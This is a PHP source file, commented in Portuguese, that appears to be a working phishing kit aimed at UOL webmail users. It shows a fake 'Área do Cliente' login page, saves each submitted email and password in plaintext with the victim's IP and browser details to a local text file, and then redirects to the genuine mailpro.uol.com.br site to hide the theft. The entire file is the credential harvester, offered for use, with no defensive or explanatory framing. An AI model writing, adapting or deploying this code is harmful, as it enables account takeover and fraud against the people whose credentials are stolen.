<?php
// =============================================
// RECEBER.PHP - VERSÃO CORRIGIDA
// =============================================

// Mostra erros (remova depois que funcionar)
ini_set('display_errors', 1);
error_reporting(E_ALL);

// =============================================
// CONFIGURAÇÕES
// =============================================
$arquivo = 'dados.txt';
$url_redirecionamento = 'https://mailpro.uol.com.br/'; // URL de redirecionamento
$senha_admin = "admin123"; // Troque isso!

// =============================================
// SE FOR ACESSO DIRETO, MOSTRA O FORMULÁRIO
// =============================================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Área do Cliente</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            .container {
                background: white;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                width: 100%;
                max-width: 400px;
            }
            h2 { text-align: center; color: #333; margin-bottom: 30px; }
            input {
                width: 100%;
                padding: 14px;
                margin: 10px 0 20px;
                border: 2px solid #e0e0e0;
                border-radius: 10px;
                font-size: 16px;
                transition: border-color 0.3s;
            }
            input:focus {
                outline: none;
                border-color: #667eea;
            }
            button {
                width: 100%;
                padding: 16px;
                background: #667eea;
                color: white;
                border: none;
                border-radius: 10px;
                font-size: 18px;
                cursor: pointer;
                transition: background 0.3s;
            }
            button:hover { background: #5a67d8; }
            .mensagem {
                text-align: center;
                padding: 10px;
                margin-bottom: 20px;
                border-radius: 8px;
                display: none;
            }
            .sucesso {
                background: #d4edda;
                color: #155724;
                border: 1px solid #c3e6cb;
            }
            .erro {
                background: #f8d7da;
                color: #721c24;
                border: 1px solid #f5c6cb;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🔐 Área do Cliente</h2>
            <div id="mensagem" class="mensagem"></div>
            <form method="POST" id="loginForm">
                <label>📧 Email:</label>
                <input type="email" name="email" id="email" required>
                
                <label>🔑 Senha:</label>
                <input type="password" name="password" id="password" required>
                
                <button type="submit">Acessar</button>
            </form>
        </div>

        <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!email || !password) {
                e.preventDefault();
                mostrarMensagem('Preencha todos os campos!', 'erro');
            }
        });
        
        function mostrarMensagem(texto, tipo) {
            const msg = document.getElementById('mensagem');
            msg.textContent = texto;
            msg.className = 'mensagem ' + tipo;
            msg.style.display = 'block';
            setTimeout(() => msg.style.display = 'none', 3000);
        }
        </script>
    </body>
    </html>
    <?php
    exit;
}

// =============================================
// PROCESSAMENTO DO POST (RECEBE OS DADOS)
// =============================================

// Captura os dados
$email = trim($_POST['email'] ?? '');
$senha = trim($_POST['password'] ?? '');

// Validação básica
if (empty($email) || empty($senha)) {
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Filtra email
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Só salva se tiver ambos
if (!empty($email) && !empty($senha)) {
    
    // Pega IP e data
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'desconhecido';
    $data = date('d/m/Y H:i:s');
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'desconhecido';
    
    // Formata a linha com mais informações
    $linha = "[$data] $email | $senha | IP: $ip | Agent: $user_agent" . PHP_EOL;
    
    // Salva em arquivo
    if (@file_put_contents($arquivo, $linha, FILE_APPEND | LOCK_EX)) {
        // Log de sucesso silencioso
    }
}

// =============================================
// REDIRECIONA (USANDO A VARIÁVEL CORRETA)
// =============================================
header("Location:https://mailpro.uol.com.br/");
exit;
?>